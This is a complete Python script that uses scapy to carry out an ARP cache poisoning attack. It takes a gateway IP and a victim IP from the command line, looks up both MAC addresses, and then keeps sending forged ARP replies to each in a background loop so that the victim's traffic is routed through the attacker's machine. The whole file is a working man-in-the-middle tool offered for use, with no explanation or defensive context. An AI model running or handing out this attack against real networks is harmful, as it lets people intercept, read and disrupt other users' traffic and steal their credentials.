from scapy.all import *
import argparse

def get_mac_addr(ip_addr):
    resp, _ = sr(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_addr), verbose=0)
    for s, r in resp:
        return r[ARP].hwsrc
    return None

def send_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac):
    print("[.] Packet Sending...")
    try:
        while True:
            send(ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip))
            send(ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip))
            time.sleep(1)
    except KeyboardInterrupt:
        print("[.] Stopped!")

parser = argparse.ArgumentParser()
parser.add_argument("gateway", help="Gateway IP")
parser.add_argument("victim", help="Victim IP")
args = parser.parse_args()

gateway_mac = get_mac_addr(args.gateway)
victim_mac  = get_mac_addr(args.victim)

print("[!] ARP Poison")
print(f"[.] Gateway IP: {args.gateway}")
print(f"[.] Victim IP: {args.victim}")

print(f"[.] Gateway MAC: {gateway_mac}")
print(f"[.] Victim MAC: {victim_mac}")

arp_attack = threading.Thread(target=send_arp_packet, args=(args.gateway, gateway_mac, args.victim, victim_mac))
arp_attack.start()
